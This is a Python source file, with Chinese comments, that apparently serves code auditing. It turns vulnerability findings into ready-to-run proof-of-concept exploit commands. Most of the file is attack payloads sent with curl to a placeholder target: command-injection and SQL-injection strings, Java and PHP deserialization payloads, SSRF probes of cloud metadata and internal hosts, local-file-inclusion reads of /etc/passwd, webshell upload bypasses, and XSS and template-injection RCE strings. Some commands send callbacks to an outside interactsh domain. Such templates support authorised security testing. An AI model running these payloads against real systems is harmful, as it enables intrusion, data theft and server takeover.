#!/usr/bin/env python3
"""
PoC Generator — 根据审计发现自动生成漏洞 PoC

根据漏洞类型生成对应的验证脚本/curl 命令。
"""

import os
import sys

class PoCGenerator:
    """PoC 自动生成器"""

    def generate(self, finding: dict, source_dir: str) -> str:
        """根据 finding 类型生成 PoC"""
        vuln_type = finding.get('type', '').lower()

        if 'rce' in vuln_type or '命令' in vuln_type:
            return self._gen_rce_poc(finding)
        elif 'sql' in vuln_type:
            return self._gen_sqli_poc(finding)
        elif 'deseriali' in vuln_type or '反序列' in vuln_type:
            return self._gen_deser_poc(finding)
        elif 'ssrf' in vuln_type:
            return self._gen_ssrf_poc(finding)
        elif 'file' in vuln_type and ('include' in vuln_type or 'upload' in vuln_type):
            return self._gen_file_poc(finding)
        elif 'xss' in vuln_type:
            return self._gen_xss_poc(finding)
        elif 'ssti' in vuln_type:
            return self._gen_ssti_poc(finding)
        else:
            return self._gen_generic_poc(finding)

    def _gen_rce_poc(self, finding: dict) -> str:
        file = finding.get('file', 'unknown')
        line = finding.get('line', '?')
        return f"""# RCE PoC — {file}:{line}
# 验证方式: 发送命令，观察是否执行

# 方式1: curl 验证
curl -s "http://TARGET/{file}?cmd=id"

# 方式2: POST 方式
curl -s -X POST "http://TARGET/{file}" \\
  -d "cmd=id"

# 方式3: 带外验证 (推荐，无回显时使用)
# 先启动 interactsh-client 获取域名
curl -s "http://TARGET/{file}?cmd=curl+YOUR_INTERACT_DOMAIN"

# 预期结果: 返回 uid=xxx 或 interactsh 收到 DNS 请求
"""

    def _gen_sqli_poc(self, finding: dict) -> str:
        file = finding.get('file', 'unknown')
        return f"""# SQL Injection PoC — {file}
# 验证方式: 布尔盲注 / 联合查询 / 时间盲注

# 方式1: 布尔盲注
curl -s "http://TARGET/{file}?id=1' AND 1=1--" # 正常页面
curl -s "http://TARGET/{file}?id=1' AND 1=2--" # 异常/空页面

# 方式2: 时间盲注 (如果页面无差异)
curl -s "http://TARGET/{file}?id=1' AND SLEEP(5)--"
# 预期: 响应延迟5秒

# 方式3: 联合查询 (确认列数后)
curl -s "http://TARGET/{file}?id=1' UNION SELECT 1,2,database()--"
# 预期: 页面显示数据库名

# 方式4: 报错注入
curl -s "http://TARGET/{file}?id=1' AND extractvalue(1,concat(0x7e,version()))--"

# 注意: 只读2-3行证明即可，不要 dump 全库
"""

    def _gen_deser_poc(self, finding: dict) -> str:
        lang = finding.get('lang', 'php')
        file = finding.get('file', 'unknown')

        if lang == 'php':
            return f"""# PHP Deserialization PoC — {file}
# 需要找到可利用的 __destruct/__wakeup 链

# 步骤1: 分析可利用的类链 (gadget chain)
# 查看源码中有 __destruct() 或 __wakeup() 的类

# 步骤2: 构造 payload
php -r '
class ExploitClass {{
    public $cmd = "id";
}}
echo serialize(new ExploitClass());
'

# 步骤3: 发送
curl -s "http://TARGET/{file}" \\
  -d "data=O:12:\"ExploitClass\":1:{{s:3:\"cmd\";s:2:\"id\";}}"
"""
        else:
            return f"""# Java Deserialization PoC — {file}
# 使用 ysoserial 生成 payload

# 步骤1: 确认反序列化入口点
# 代码中的 ObjectInputStream.readObject()

# 步骤2: 生成 payload (需要 ysoserial.jar)
java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin

# 步骤3: 发送
curl -s "http://TARGET/{file}" \\
  --data-binary @payload.bin \\
  -H "Content-Type: application/octet-stream"
"""

    def _gen_ssrf_poc(self, finding: dict) -> str:
        file = finding.get('file', 'unknown')
        return f"""# SSRF PoC — {file}
# 验证方式: 使用 interactsh 带外验证

# 方式1: 探测内网 (http)
curl -s "http://TARGET/{file}?url=http://127.0.0.1:80"

# 方式2: 带外验证 (推荐)
curl -s "http://TARGET/{file}?url=http://YOUR_INTERACT_DOMAIN"

# 方式3: 读取云元数据 (AWS)
curl -s "http://TARGET/{file}?url=http://169.254.169.254/latest/meta-data/"

# 方式4: 读取本地文件 (file 协议)
curl -s "http://TARGET/{file}?url=file:///etc/passwd"

# 预期: interactsh 收到请求 / 返回内网数据 / 返回元数据
"""

    def _gen_file_poc(self, finding: dict) -> str:
        file = finding.get('file', 'unknown')
        return f"""# File Include/Upload PoC — {file}

# === 文件包含 ===
# 方式1: 本地文件包含 (LFI)
curl -s "http://TARGET/{file}?page=../../../etc/passwd"
curl -s "http://TARGET/{file}?page=....//....//....//etc/passwd"

# 方式2: PHP 伪协议
curl -s "http://TARGET/{file}?page=php://filter/convert.base64-encode/resource=config.php"

# === 文件上传 ===
# 方式1: 绕过后缀检测
curl -s -X POST "http://TARGET/upload" \\
  -F "file=@shell.php;filename=shell.php.jpg"

# 方式2: Content-Type 绕过
curl -s -X POST "http://TARGET/upload" \\
  -F "file=@shell.php;type=image/jpeg"
"""

    def _gen_xss_poc(self, finding: dict) -> str:
        file = finding.get('file', 'unknown')
        return f"""# XSS PoC — {file}

# 反射型 XSS
curl -s "http://TARGET/{file}?name=<script>alert(1)</script>"

# 如果有过滤，尝试绕过
curl -s "http://TARGET/{file}?name=<img src=x onerror=alert(1)>"
curl -s "http://TARGET/{file}?name=<svg onload=alert(1)>"

# 预期: 页面返回中包含未转义的 payload
# 截图 alert 弹窗作为证据
"""

    def _gen_ssti_poc(self, finding: dict) -> str:
        file = finding.get('file', 'unknown')
        return f"""# SSTI PoC — {file}

# 检测是否存在模板注入
curl -s "http://TARGET/{file}?name={{{{7*7}}}}"
# 如果返回 49 说明存在 SSTI

# Jinja2 RCE
curl -s "http://TARGET/{file}?name={{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}"

# Twig RCE
curl -s "http://TARGET/{file}?name={{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}"
"""

    def _gen_generic_poc(self, finding: dict) -> str:
        file = finding.get('file', 'unknown')
        vuln_type = finding.get('type', 'Unknown')
        return f"""# {vuln_type} PoC — {file}

# 根据代码分析，以下参数可能存在问题:
# 文件: {file}
# 行号: {finding.get('line', '?')}
# 匹配: {finding.get('matched_line', '')}

# 需要手动分析构造具体 payload
# 建议:
# 1. 本地搭建环境
# 2. 在该行设置断点/日志
# 3. 构造恶意输入验证
"""


if __name__ == "__main__":
    # 简单测试
    gen = PoCGenerator()
    test_finding = {
        "type": "SQL Injection",
        "file": "admin/login.php",
        "line": 42,
        "lang": "php",
        "matched_line": "$result = mysql_query(\"SELECT * FROM users WHERE id=\" . $_GET['id']);",
    }
    print(gen.generate(test_finding, "."))
